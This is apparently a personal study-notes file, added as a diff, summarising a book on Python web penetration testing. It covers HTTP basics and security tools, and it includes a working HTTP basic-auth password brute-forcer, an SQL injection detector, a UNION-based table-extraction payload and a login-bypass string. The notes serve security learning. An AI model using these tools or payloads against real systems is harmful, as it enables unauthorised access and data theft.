@@ -1,0 +1,448 @@
+Learning python web penetration testing=Christian Martorella;Note=Erxin
+
+# Preface
+- Security report
+
+EMC (https://www.scmagazine.com/study-it-leaders-count-the-cost-of-breaches-data-loss-and-downtime/article/542793/
+
+    Configuration and deployment management testing
+    Identity management testing
+    Authentication testing
+    Authorization testing
+    Session management testing
+    Input validation
+    Testing error handling
+    Cryptography
+    Business logic testing
+    Client-side testing
+
+- OWASP testing guide: https://www.owasp.org/index.php/OWASP_Testing_Project.
+
+- The most used HTTP proxies by security professionals are Burp Suite from PortSwigger security
+
+ (https://portswigger.net/burp/proxy.html) 
+ 
+ Zed Attack Proxy (ZAP) (https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project).
+
+- crawlers and spiders 
+
+Scrapy (http://scrapy.org), which are written in Python or command-line tools such as HT track (http://www.httrack.com)
+
+web application security scanners are w3af (http://w3af.org/), which is written in Python
+
+Arachni (http://www.arachni-scanner.com/), which is written in Ruby
+
+Acunetix (http://www.acunetix.com/), which is one of the cheapest and provides good value for money
+
+- brute forces/predictable resource locators 
+
+DIRB (http://dirb.sourceforge.net/), which is still available and maintained by Dark Raver
+
+ones provided by FUZZDB (https://github.com/fuzzdb-project), a database of wordlists for web application testing
+
+
+# Interacting with web applications 
+- HTTP/1.0 defines three methods:
+
+HEAD: This will only return the headers and the status code without its content
+GET: This is the standard method used to retrieve resource content given a URI
+POST: This is a method used to submit content to the server, form data, files, and so on
+
+- HTTP/1.1 introduced the following methods:
+
+OPTIONS: This provides the communication options for the target resource
+PUT: This requests to store a resource identified by the given URI
+DELETE: This removes all representations of the target resource identified by the given URI
+TRACE: This method echoes the received request so that the client can see what changes or editions have been made by intermediate servers
+CONNECT: This establishes a tunnel to the server identified by a given URI used by HTTPS
+PATCH: This method applies partial modifications to a resource
+
+- HEAD, GET, OPTIONS, and TRACE are by convention defined as safe, which means they are intended only for information retrieval and should not change the state of the server.
+
+- anatomyy of an http request 
+
+User-agent: This informs the server what type of OS, browser, and plugins the users have.
+
+Accept-encoding: This defines which encoding the browser supports, which is usually GZip or Deflate. This will compress the content and reduce the bandwidth time for every transaction.
+
+Referer: This contains the referer URL, basically from which page you clicked that link.
+
+Cookie: If our browser has cookies for its site, it will add them in the Cookie header. We also have server-side headers, which are set by the web server.
+
+Cache-Control: This defines the directives, which must be obeyed by all caching mechanisms along the chain.
+
+Location: This is used for re-directions. Whenever there is a 301 or 302 response, the server must send this header.
+
+Set-Cookie: This is a header used to set a cookie in the user's browser.
+
+WWW-Authenticate: This header is used by the server to request authentication. When the browser sees this header, it will open a login window asking for the username and password.
+
+- GET request 
+
+    + Terminal and type the following
+    $ telnet address 
+
+    GET /ip HTTP/1.0 and hit Enter twice. This is us telling the server that we are using GET to request the resource called /ip
+
+    + request with requests library 
+    ```
+    import urllib2
+
+    gh_url = 'https://api.github.com'
+
+    req = urllib2.Request(gh_url)
+
+    password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
+    password_manager.add_password(None, gh_url, 'user', 'pass')
+
+    auth_manager = urllib2.HTTPBasicAuthHandler(password_manager)
+    opener = urllib2.build_opener(auth_manager)
+
+    urllib2.install_opener(opener)
+
+    handler = urllib2.urlopen(req)
+
+    print handler.getcode()
+    print handler.headers.getheader('content-type')
+    ```
+
+    ```
+    import requests
+
+    r = requests.get('https://api.github.com', auth=('user', 'pass'))
+
+    print r.status_code
+    print r.headers['content-type']
+    ```
+
+- setting headers 
+
+```
+#!/usr/bin/env
+import requests
+r = requests.get('http://httpbin.org/ip')
+print r.url
+print 'Status code:'
+print '\t[-]' + str(r.status_code) + '\n'
+
+print 'Server headers'
+print '****************************************'
+for x in r.headers:
+    print '\t' + x + ' : ' + r.headers[x]
+print '****************************************\n'
+
+print "Content:\n"
+print r.text
+```
+
+- http response codes 
+
+
+1XX-Informational: The 100 range codes are used for informational purposes. It is only present in HTTP/1.1.
+
+2XX-Success: The 200 range of codes are used to indicate that the action requested by the client was received, understood, accepted, and processed. The most common is 200 OK.
+
+3XX-Redirection: The 300 range indicates the client that must take additional actions to complete the request. Most of these codes are used in URL redirection. The most common of this group is the 302 Found code.
+
+4XX-Client-side error: The 400 range are used to indicate that the client has had an error. The most common is 404 Not Found.
+
+5XX-Server-side error: The range 500 is used to indicate an error on the server side. The most common is 500 Internal Server Error.
+
+
+# Web Crawling with Scrapy - mapping the application 
+- scrapy
+
+https://scrapy.org/
+
+FUZZDB (https://github.com/fuzzdb-project/fuzzdb) is one of the most popular and complete databases available on the internet
+
+
+# Resource discovery 
+- web driver for Python (http://docs.seleniumhq.org) 
+
+- PhantomJS (http://phantomjs.org/). Selenium WebDriver is a tool used to automate web browsers pragmatically
+
+
+# Password testing 
+- basic authentication 
+
+python back2basics.py -w http://www.scruffybank.com/Admin -u admin -t 5 -f pass.txt
+
+```
+
+def start(argv):
+    banner()
+    if len(sys.argv) < 5:
+        usage()
+        sys.exit()
+    try:
+        opts, args = getopt.getopt(argv, "u:w:f:t:")
+    except getopt.GetoptError:
+        print "Error en arguments"
+        sys.exit()
+
+    for opt, arg in opts:
+        if opt == '-u':
+            user = arg
+        elif opt == '-w':
+            url = arg
+        elif opt == '-f':
+            dictio = arg
+        elif opt == '-t':
+            threads = arg
+    try:
+        f = open(dictio, "r")
+        name = f.readlines()
+    except:
+        print"Failed opening file: " + dictio + "\n"
+        sys.exit()
+    launcher_thread(name, threads, user, url)
+
+def launcher_thread(names, th, username, url):
+    global i
+    i = []
+    i.append(0)
+    while len(names):
+        if hit == "1":
+            try:
+                if i[0] < th:
+                    n = names.pop(0)
+                    i[0] = i[0] + 1
+                    thread = request_performer(n, username, url)
+                    thread.start()
+
+            except KeyboardInterrupt:
+                print "Brute forcer interrupted by user. Finishing attack.."
+                sys.exit()
+            thread.join()
+        else:
+            sys.exit()
+    return
+
+class request_performer(Thread):
+    def __init__(self, name, user, url):
+        Thread.__init__(self)
+        self.password = name.split("\n")[0]
+        self.username = user
+        self.url = url
+        print "-" + self.password + "-"
+
+    def run(self):
+        global hit
+        if hit == "1":
+            try:
+                r = requests.get(self.url, auth=(self.username, self.password))
+                if r.status_code == 200:
+                    hit = "0"
+                    print "[+] Password found - " + colored(self.password, 'green') + " - !!!\r"
+                    sys.exit()
+                else:
+                    print "Not valid " + self.password
+                    i[0] = i[0] - 1 # Here we remove one thread from the counter
+            except Exception, e:
+                print e
+```
+
+- digetst authentication
+md5, HA1, HA2
+
+
+# Detecting and exploiting SQL injection vulerabilities 
+
+
+$name=$_POST("UserName");
+$pass=$_POST("UserPass");
+
+sql="SELECT * FROM Users WHERE Username='$name' and password='$pass'"
+
+sql="SELECT * FROM Users WHERE Username='admin' and password='superRoot'"
+
+$name=$_POST("UserName");
+$pass=$_POST("UserPass");
+
+sql="SELECT * FROM Users WHERE Username='$name' and password='$pass'"
+
+sql="SELECT * FROM Users WHERE Username='' or '1'='1'' and password='' or '1'='1''"
+
+- detecting sqli 
+
+Error based: This method injects payloads that break out of the original query and generate an SQL error on the server
+
+This method injects payloads that alter the outcome of the original query, which makes the application return different page content.
+http://...?id=xxx and substring...=5...
+
+Time-based: This method injects a payload that triggers a delay in the SQL server while processing the query
+
+- automating the detection 
+
+```
+def banner():
+  print "\n***************************************"
+  print "* SQlinjector 1.0 *"
+  print "***************************************"
+
+def usage():
+  print "Usage:"
+  print " -w: url (http://somesite.com/news.php?id=FUZZ)\n"
+    print " -i: injection strings file \n"
+  print "example: SQLinjector.py -w http://www.somesite.com/news.php?id=FUZZ \n"
+  
+def start(argv):
+    banner()
+  if len(sys.argv) < 2:
+       usage()
+       sys.exit()
+  try:
+    opts, args = getopt.getopt(argv,"w:i:")
+  except getopt.GetoptError:
+    print "Error en arguments"
+    sys.exit()
+  for opt,arg in opts :
+    if opt == '-w' :
+      url=arg
+    elif opt == '-i':
+      dictio = arg
+  try:
+    print "[-] Opening injections file: " + dictio
+    f = open(dictio, "r")
+    name = f.read().splitlines()
+  except:
+    print"Failed opening file: "+ dictio+"\n"
+    sys.exit()
+  launcher(url,name)
+  
+def launcher (url,dictio):
+  injected = []
+  for sqlinjection in dictio:
+    injected.append(url.replace("FUZZ",sqlinjection))
+  res = injector(injected)
+  print "\n[+] Detection results:"
+  print "------------------"
+  for x in res:
+    print x.split(";")[0]
+    
+def injector(injected):
+  errors = ['Mysql','error in your SQL']
+  results = []
+  for y in injected:
+    print "[-] Testing errors: " + y
+    req=requests.get(y)
+    for x in errors:
+      if req.content.find(x) != -1:
+          res = y + ";" + x
+          results.append(res)
+  return results
+```
+
+- exploiting a sql injection to extract data 
+
+Basic data: For example, database version, user running the database, current database, database directory, and so on
+
+Advanced data: MySQL usernames and passwords, databases, table names, column names, and content from tables
+
+OS files: We can read any file in the file system as long as the user running the database has privileges
+
+- pentestmonkey Cheat Sheet (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet).
+
+
+- advanced sqli exploiting 
+
+```
+def detect_table_names(url):
+  new_url= url.replace("FUZZ","""\'%20union%20SELECT%20CONCAT('TOK',
+  table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM
+  %20information_schema.tables%20WHERE%20table_schema%20!=%20
+  %27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27
+  %20and%20table_schema%20!=%20%27performance_schema%27%20--%20-""")
+  req=requests.get(new_url)
+  raw = req.content
+  reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
+  tables=re.findall(reg,req.content)
+  for table in tables:
+    print table
+```
+
+- http proxy 
+
+There is no direct communication between the client and the server. Instead, the client connects to the proxy and sends a request to it. Then the proxy will fetch the resources from the remote server, and finally return the response back
+
+    + need a proxy for 
+privacy 
+
+bypassing filters and censorship 
+
+logging and eavesdropping 
+
+caching 
+
+filtering and blocking 
+
+manipulating and modifying traffic 
+
+    + types of proxy 
+forward proxies 
+
+reverse proxies, hide behind network architecture or distribute load between real servers 
+
+trasparent proxies, intercept normal communications at the network layer without requiring any configuration on the client side 
+
+- mitmproxy 
+
+use proxy for HTTP connections, and we fire up a request such as http://www.edge-security.com/
+
+mitmproxy at https://mitmproxy.org/. It is really well documented. 
+
+- inline script,  access the response via handlers with request module 
+
+start 
+
+clientconnect 
+
+request 
+
+serverconnect 
+
+responseheaders 
+
+response 
+
+error 
+
+clientdisconnect 
+
+done 
+
+- sqli process FUZZ replace http request field in url, headers 
+
+- improve skills 
+
+OWASP WebGoat (https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project). This is a training course provided on the form of a VM
+
+Pentester Lab (https://www.pentesterlab.com/) provides vulnerable applications that can be used to test and understand vulnerabilities.
+
+OWASP-WADP (https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project), a collection of vulnerable apps to provide environments
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
